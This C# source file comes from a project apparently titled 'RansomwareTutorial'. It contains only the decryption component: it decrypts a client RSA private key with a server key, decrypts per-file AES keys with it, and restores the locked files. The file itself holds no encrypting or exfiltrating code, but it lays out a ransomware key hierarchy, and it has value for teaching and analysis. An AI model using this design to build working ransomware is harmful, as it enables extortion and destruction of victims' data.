using RansomwareTutorial.Models;
using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace RansomwareTutorial.Controllers
{
    public static class DecryptionProcessor
    {
        public static bool LocateClientPrivateKeyAndDecrypt(string clientRsaPrivateKeyLocation, string serverRsaPrivateKeyLocation)
        {
            var clientRsaPrivateKey = File.ReadAllBytes(clientRsaPrivateKeyLocation);
            var rsaServerPrivateKey = File.ReadAllText(serverRsaPrivateKeyLocation);

            var privateKeyEncrypted = CryptoHelper.DecryptLongRSA(clientRsaPrivateKey, rsaServerPrivateKey);
            File.WriteAllBytes(clientRsaPrivateKeyLocation, privateKeyEncrypted);

            return true;
        }

        public static bool DecryptAESKeys(string aesLocation, string clientRsaPrivateKeyLocation)
        {
            var aesKeysLocations = Directory.GetFiles(aesLocation, "*", SearchOption.TopDirectoryOnly);
            var rsaServerPrivateKey = File.ReadAllText(clientRsaPrivateKeyLocation);

            foreach (var file in aesKeysLocations)
            {
                var aesEncrypted = CryptoHelper.DecryptRSA(File.ReadAllBytes(file), rsaServerPrivateKey);
                File.WriteAllBytes(file, aesEncrypted);
            }

            return true;
        }

        public static bool DecryptLockedFiles(string aesLocation, string lockedDataLocation)
        {
            var filesLocked = Directory.GetFiles(lockedDataLocation, "*", SearchOption.TopDirectoryOnly);

            foreach (var file in filesLocked)
            {
                byte[] key = File.ReadAllBytes(Path.Combine(aesLocation, "AES_KEY-" + Path.GetFileNameWithoutExtension(file) + ".txt"));
                byte[] iv = File.ReadAllBytes(Path.Combine(aesLocation, "AES_IV-" + Path.GetFileNameWithoutExtension(file) + ".txt"));

                var aesKey = CryptoHelper.GenerateAESKey(key, iv);
                var decryptor = aesKey.CreateDecryptor();
                var fileBytes = File.ReadAllBytes(file);
                CryptoHelper.CryptoAES(decryptor, file, fileBytes, lockedDataLocation);
            }

            return true;
        }
    
    }
}
